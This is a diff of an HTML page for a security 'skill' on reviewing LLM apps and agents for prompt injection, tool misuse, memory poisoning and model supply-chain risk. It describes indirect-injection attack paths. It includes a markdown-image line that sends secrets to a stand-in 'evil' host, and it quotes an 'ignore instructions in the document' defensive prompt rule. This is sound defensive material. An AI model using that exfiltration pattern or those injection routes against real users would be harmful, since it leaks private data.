@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,10 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Assess and harden LLM applications and agentic systems against prompt injection, tool misuse, excessive agency, memory poisoning, RAG data leakage, and model supply-chain risk, mapped to the OWASP Top 10 for LLM and Agentic Applications. Use when reviewing an AI feature, agent, MCP server, or RAG pipeline for security, or when threat modeling an autonomous system.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-core</div>
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>LLM applications break the assumption every other security control is built on: that instructions and data are separable. In an LLM, data <em>is</em> instructions. Every design that reads untrusted content and then acts has to be evaluated with that in mind, and no amount of prompt engineering fixes it.</p>
-<h2>When to Use</h2>
+<div class="wrap slayout"><article><p>LLM applications break the assumption every other security control is built on: that instructions and data are separable. In an LLM, data <em>is</em> instructions. Every design that reads untrusted content and then acts has to be evaluated with that in mind, and no amount of prompt engineering fixes it.</p>
+<h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>Security review of an LLM-backed feature, chatbot, or copilot</li>
 <li>Threat modeling an agentic system: tools, autonomy, memory, multi-agent</li>
@@ -48,7 +59,7 @@
 <li>Evaluating model, dataset, and dependency supply chain</li>
 <li>Red teaming an AI system with authorization</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Conventional web/API vulnerabilities in the surrounding app</strong> — use</li>
 </ul>
@@ -60,13 +71,13 @@
 <ul>
 <li><strong>Model safety alignment research</strong> — different discipline</li>
 </ul>
-<h2>Route to a Depth Skill</h2>
+<h2 id="route-to-a-depth-skill">Route to a Depth Skill</h2>
 <div class="tw"><table><thead><tr><th>Focus</th><th>Skill</th></tr></thead><tbody><tr><td>Auditing an MCP server specifically — tool-definition injection, per-tool authorization, transport security, resource exposure</td><td><a class="xref" href="auditing-mcp-servers.html"><code>auditing-mcp-servers</code></a></td></tr></tbody></table></div>
 <p>The MCP review here is one part of a wider AI threat model; reach for <a class="xref" href="auditing-mcp-servers.html"><code>auditing-mcp-servers</code></a> when the server implementation itself is the target.</p>
-<h2>The Core Rule</h2>
+<h2 id="the-core-rule">The Core Rule</h2>
 <blockquote><strong>Treat every model output as untrusted user input, and every input the model reads as potentially adversarial instructions.</strong></blockquote>
 <p>From that single rule, most of the correct architecture follows: never route model output into a sink without the same validation you would apply to a form field, and never grant the model an authority the <em>least trusted content it will read</em> should not have.</p>
-<h2>The Lethal Trifecta</h2>
+<h2 id="the-lethal-trifecta">The Lethal Trifecta</h2>
 <p>An agent is exposed to serious compromise when it has all three of:</p>
 <ol>
 <li><strong>Access to private data</strong> (files, DB, internal APIs, user context)</li>
@@ -75,7 +86,7 @@
 </ol>
 <p>Any two are usually manageable. All three means untrusted content can direct the agent to read secrets and send them out. When reviewing an agentic system, find whether the trifecta closes — and if it does, that is the finding, before any specific payload.</p>
 <p>Breaking any one leg is a valid mitigation: scope the data, sanitize/isolate the content, or gate egress behind human approval.</p>
-<h2>Threat Areas</h2>
+<h2 id="threat-areas">Threat Areas</h2>
 <h3>Prompt injection — direct and indirect</h3>
 <p><strong>Indirect injection is the one that matters.</strong> Instructions embedded in a web page, PDF, email, repository file, calendar invite, or database row that the model retrieves and follows.</p>
 <p>Review questions:</p>
@@ -91,8 +102,9 @@
 <li>What is the worst action reachable from a successful injection? That is the</li>
 </ul>
 <p>real severity, not the injection itself.</p>
-<pre><code>Test payloads live in `references/ai-test-cases.md`. The important test is not
-whether a payload works — it is what the payload can reach when it does.</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="Test payloads live in `references/ai-test-cases.md`. The important test is not
+whether a payload works — it is what the payload can reach when it does.">copy</button><pre><code>Test payloads live in `references/ai-test-cases.md`. The important test is not
+whether a payload works — it is what the payload can reach when it does.</code></pre></div>
 <p><strong>Mitigations that work</strong>: capability restriction (the agent cannot do the harmful thing at all), human approval on consequential actions, egress allowlisting, separate untrusted content into a sub-agent with no tools and no secrets, dual-model patterns where a privileged planner never sees raw untrusted text.</p>
 <p><strong>Mitigations that do not work alone</strong>: "ignore instructions in the document" system prompts, input filtering for injection strings, output classifiers. These raise cost; they do not close the hole. Never accept a design whose only control is a prompt instruction.</p>
 <h3>Excessive agency and tool misuse</h3>
@@ -133,7 +145,16 @@ whether a payload works — it is what the payload can reach when it does.</code
 <div class="tw"><table><thead><tr><th>Sink</th><th>Risk</th></tr></thead><tbody><tr><td><code>innerHTML</code> / markdown renderer</td><td>XSS; also image tags used for exfil via URL parameters</td></tr><tr><td>SQL / shell / eval</td><td>Injection with a fully attacker-influenceable string</td></tr><tr><td>File path</td><td>Traversal</td></tr><tr><td>HTTP request URL</td><td>SSRF and data exfiltration channel</td></tr><tr><td>Downstream agent's prompt</td><td>Injection propagation across agents</td></tr></tbody></table></div>
 <p>Markdown image rendering deserves specific attention: <code>![](https://evil/?d=&amp;lt;secrets&amp;gt;)</code> in model output is a zero-click exfiltration channel in most chat UIs. Check the renderer's allowed domains.</p>
 <h3>Model and data supply chain</h3>
-<pre><code># Never load pickle-based weights from an untrusted source
+<div class="codeblk cx"><button class="copy" data-copy="# Never load pickle-based weights from an untrusted source
+# .bin / .pt / .ckpt → arbitrary code execution on load. Prefer safetensors.
+python3 -c &quot;import safetensors; print(&#x27;use this format&#x27;)&quot;
+picklescan -p model.pt          # scan before any load
+modelscan -p ./models/
+
+# Verify provenance
+# - model card, license, and origin org
+# - hash pinning in the loader, not &quot;latest&quot;
+# - dataset provenance for fine-tunes; poisoned training data is unrecoverable">copy</button><pre><code># Never load pickle-based weights from an untrusted source
 # .bin / .pt / .ckpt → arbitrary code execution on load. Prefer safetensors.
 python3 -c "import safetensors; print('use this format')"
 picklescan -p model.pt          # scan before any load
@@ -142,7 +163,7 @@ modelscan -p ./models/
 # Verify provenance
 # - model card, license, and origin org
 # - hash pinning in the loader, not "latest"
-# - dataset provenance for fine-tunes; poisoned training data is unrecoverable</code></pre>
+# - dataset provenance for fine-tunes; poisoned training data is unrecoverable</code></pre></div>
 <p>Also review: unpinned model versions in production, third-party inference providers and what they retain, and fine-tuning datasets containing customer data (an extraction risk and often a compliance one).</p>
 <h3>MCP servers and tool definitions</h3>
 <ul>
@@ -161,8 +182,8 @@ modelscan -p ./models/
 <li>Cross-server leakage: one server's tool results can influence calls to</li>
 </ul>
 <p>another server's tools.</p>
-<h2>Review Workflow</h2>
-<pre><code>1. Map:      inputs → model → tools/sinks. Draw it. Mark every trust boundary.
+<h2 id="review-workflow">Review Workflow</h2>
+<div class="codeblk cx"><button class="copy" data-copy="1. Map:      inputs → model → tools/sinks. Draw it. Mark every trust boundary.
 2. Classify: for each input, is it attacker-writable? For each tool, what is
              the worst-case invocation?
 3. Trifecta: does private data + untrusted content + egress close?
@@ -170,9 +191,17 @@ modelscan -p ./models/
              server-side?
 5. Test:     indirect injection through the real ingestion path, not the chat box
 6. Blast:    for each successful injection, enumerate reachable impact
-7. Fix:      prefer architectural constraints over prompt-level defenses</code></pre>
+7. Fix:      prefer architectural constraints over prompt-level defenses">copy</button><pre><code>1. Map:      inputs → model → tools/sinks. Draw it. Mark every trust boundary.
+2. Classify: for each input, is it attacker-writable? For each tool, what is
+             the worst-case invocation?
+3. Trifecta: does private data + untrusted content + egress close?
+4. Identity: at each tool call, whose authority is used, and is it checked
+             server-side?
+5. Test:     indirect injection through the real ingestion path, not the chat box
+6. Blast:    for each successful injection, enumerate reachable impact
+7. Fix:      prefer architectural constraints over prompt-level defenses</code></pre></div>
 <p>Test through the real path. An injection that works when pasted into chat but cannot reach the retrieval pipeline is a demo; one delivered through an indexed document is a vulnerability.</p>
-<h2>Rationalizations to Reject</h2>
+<h2 id="rationalizations-to-reject">Rationalizations to Reject</h2>
 <ul>
 <li><em>"The system prompt tells it to ignore injected instructions."</em> Not a</li>
 </ul>
@@ -201,7 +230,7 @@ modelscan -p ./models/
 <li><em>"A guardrail model checks the output."</em> It is another model reading</li>
 </ul>
 <p>attacker-influenced text.</p>
-<h2>Deliverable</h2>
+<h2 id="deliverable">Deliverable</h2>
 <ul>
 <li>Architecture diagram with trust boundaries and the trifecta assessment</li>
 <li>Per-tool table: authority used, authorization enforcement point, worst-case</li>
@@ -216,12 +245,15 @@ modelscan -p ./models/
 <li>Supply-chain findings: model format, pinning, provenance, MCP servers</li>
 <li>Recommendations ordered by architectural strength, not by ease</li>
 </ul>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><code>references/ai-test-cases.md</code> — injection test corpus and tool-abuse cases</li>
 <li><a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a> — the conventional bugs in the same app</li>
 <li>OWASP Top 10 for LLM Applications; OWASP Top 10 for Agentic Applications (2026)</li>
 <li>MITRE ATLAS for adversarial ML techniques</li>
 <li>NIST AI RMF for governance framing</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#route-to-a-depth-skill">Route to a Depth Skill</a><a href="#the-core-rule">The Core Rule</a><a href="#the-lethal-trifecta">The Lethal Trifecta</a><a href="#threat-areas">Threat Areas</a><a href="#review-workflow">Review Workflow</a><a href="#rationalizations-to-reject">Rationalizations to Reject</a><a href="#deliverable">Deliverable</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · core · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
